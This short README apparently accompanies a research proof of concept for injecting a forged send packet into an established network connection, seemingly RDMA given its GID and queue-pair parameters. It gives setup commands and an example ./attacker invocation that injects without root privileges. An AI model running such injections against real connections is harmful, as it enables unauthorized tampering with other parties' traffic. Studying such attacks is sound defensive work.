Create a connection using ./main as a client as a server. See ./main -h
Run ./attacker with correct info to inject one send packet.
The server side will help and print all parameters. 


Usage
--------------------------


On the server:
./main -g 0
where -g 0 is the index of used GID. 

On the client:
./main -g 0 192.168.1.10
where -g 0 is the index of used GID, and 192.168.1.10 is the ip of the server.


The server will output a command that can be executed at the client machine to inject without sudo. For example:
./attacker  -i 1 -q 149 --psn=1 -s 0 -t 0 -g 0 -x 0x0 -z 0xa01a8c0ffff0000
